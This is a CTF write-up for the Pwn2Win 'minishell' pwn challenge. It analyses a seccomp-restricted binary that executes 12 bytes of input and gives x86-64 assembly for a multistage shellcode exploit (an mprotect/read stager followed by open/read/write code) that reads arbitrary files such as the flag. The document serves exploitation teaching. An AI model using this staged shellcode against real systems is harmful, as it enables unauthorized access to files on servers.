# Pwn2Win — minishell
<!--Authors: littlewho-->

Hello, hackers!

I’ve recently took part in Pwn2Win CTF and they had very interesting challenges, it was a lot of fun to solve them. One of the tasks in the pwning category that I succeeded to solve was minishell . Let’s analyze it a little bit.

We have a 64-bit ELF binary running on a Linux server and no LIBC is provided. You can download the binary [here](https://github.com/JustBeYou/ctfs/blob/master/pwn2win/minishell).

![Running the binary](https://cdn-images-1.medium.com/max/2000/1*v524O7lZTLNuc7ATo5fNyg.png)*Running the binary*

We see that there is not much interaction between us and the program, it only reads a string and then it crashes. The message “Executing…” leads us to the idea that maybe it is executing the input that it receives, but let’s not make any false assumptions before we see the actual content. I will step into every significant piece of code, for a better understanding.

![Binary exploitation prevention features](https://cdn-images-1.medium.com/max/2000/1*pJWVwxB6wkTGi_63NCGXRg.png)*Binary exploitation prevention features*

![Main entry of the program](https://cdn-images-1.medium.com/max/2000/1*Kv9t-SJ_HlL-wTkqPov21A.png)*Main entry of the program*

Here we see the entry of the program, basic stack setup, no interesting things. Just after that, something caught my attention, a call to mmap . This is a standard C function that requests memory pages from the operating system.

![mmap(NULL, 0x1000, 0x7, 0x22, 0, 0)](https://cdn-images-1.medium.com/max/2000/1*d3wgF28izTqQrqM768nUsg.png)*mmap(NULL, 0x1000, 0x7, 0x22, 0, 0)*

According to the manual pages, protection 0x7 means READ/WRITE/EXECUTE permissions. The result of the mmap call is stored into a stack variable.

![read(0, buf, 0x1000)](https://cdn-images-1.medium.com/max/2000/1*Qujn3xfh8qSAnELOlqJULg.png)*read(0, buf, 0x1000)*

This call to the read function seems to allow us up to 4096 (0x1000 in hex) bytes of memory to be stored, but the cmp [rbp+var_C], 0xCh instruction compares the number of read bytes with 12, if it is lower or equal we perform a jump to another piece of code. If the condition is not satisfied, the program will simply exit.

![Call to sub_ABA and mprotect(buf, 0x1000, 0x5)](https://cdn-images-1.medium.com/max/2000/1*TjPTiVnokYbCY8RSRWka1Q.png)*Call to sub_ABA and mprotect(buf, 0x1000, 0x5)*

Here we see three important elements:

* a call to some procedure sub_ABA

* a mprotect call that will change the protection of the specified memory area. According to the manual pages 0x5 means READ/EXECUTE

* jmp into the user controlled buffer

Let’s inspect the sub_ABA in order to have a full understanding of the program.

![Adding seccomp rules in order to restrict syscalls](https://cdn-images-1.medium.com/max/2000/1*wfCnD7jiRWlrWtn95rOxYA.png)*Adding seccomp rules in order to restrict syscalls*

The whole function is filled with calls to seccomp_rule_add . seccomp module, the short form for secure computing mode, is a security enhancement that is able to restrict system calls, file access and other permissions. According to the manual 0x7FFF0000 flag means “allow the specified system call number”. So, our binary and also our future shell is only able to use few system calls. Inspecting the binary we know that they are the following: open , read , write , close , mprotect and exit .

Summarizing, we are able to send 12 bytes of shellcode that will be executed and we can’t call system, so we’ll need to read the flag using the open and read calls. For sure, we can’t do this in only 12 bytes, so we need to implement a multistage exploit. The first part will allow us to send a bigger shell in the second step. The objectives for the first stage are:

* call mprotect to make the buffer writable again

* call read again with a larger size

I’ve set a break point just before the jump to our shellcode in order to observe the resources offered by the register values.

![Registers before the jump](https://cdn-images-1.medium.com/max/2000/1*QrF6iKXM65SvN5qk3HMJUQ.png)*Registers before the jump*

We see that the registers almost have the right values for the mprotect call (rdi = buffer address, rsi = buffer size, rdx = protections). We need to change the rax value to 10, because this is the mprotect system call number. Then we need to set the protection to RWX, so the last 3 bits of mprotect prot number must be set.

    mov al,10  # 2 bytes
    mov dl,0x7 # 2 bytes
    syscall    # 2 bytes

We have 6 bytes left to use and we need to swap few registers.

    rdi = 0x0
    rsi = rdi (buffer address)
    rdx = ??? (size)

After a lot of tries, I’ve found one way to set the registers in a convenient manner:

    push rcx
    pop rsi
    push rax
    pop rdi
    syscall

But this won’t allow us to change the rdx value again. So, we will need to use the same value that we set in the mprotect call. So, let’s change 0x7 to the biggest value that will allow us to have RWX permissions and won’t mess anything else. And that’s 0xf.

And this is the first stage shell:

    mov al,10 # set the systemcall number
    mov dl,0xf # set the mprotect protection RWX
    syscall
    push rcx # set the registers for the read call
    pop rsi
    push rax
    pop rdi
    syscall

In the second stage of the exploit, the memory area is now writable and we can read 16 bytes. We need to clear the return register (rax) and put 0 in it (read system call number) and set the rdx to a bigger value. The other registers are already set from the last stage.

    xor ax,ax
    mov edx, 0xff # any value that will allow you to upload a big enough shell
    syscall

Because we already passed few bytes of the buffer with the execution, we will need a little NOP sled before the second stage.

In the last stage of the exploit, we will send a classic shellcode, we will read the filename from the user, we will open the file, read it and print the flag to the screen. Again, we will need a NOP sled for our shellcode.

    # read the filename to open
     xor rax,rax
     xor rdi,rdi
     mov rsi,rsp
     mov rdx,0xff
     syscall
     
     # open the file (fd is in rax)
     mov rax,2
     mov rdi,rsp
     xor rsi,rsi
     xor rdx,rdx
     syscall
     
     # read the file (read size is in rax)
     mov rdi,rax
     xor rax,rax
     mov rsi,rsp
     mov rdx,0xff
     syscall
     
     # write the flag and '\n'
     mov rdx,rax
     mov rax,1
     mov rdi,1
     mov rsi,rsp
     syscall

    push 0xa
     mov rdx,1
     mov rax,1
     mov rdi,1
     mov rsi,rsp
     syscall

This piece of code will allow us to open any file on the server. It was a little bit of trouble to find the path to the flag, but finally I found that it is in “/home/minishell/flag.txt”

![](https://cdn-images-1.medium.com/max/2000/1*io33hJ-MRy9RnOcT5EB76Q.png)

You can find the full script [here](https://github.com/JustBeYou/ctfs/blob/master/pwn2win/ms.py) and also other CTF and wargames solutions.

Thanks for reading!
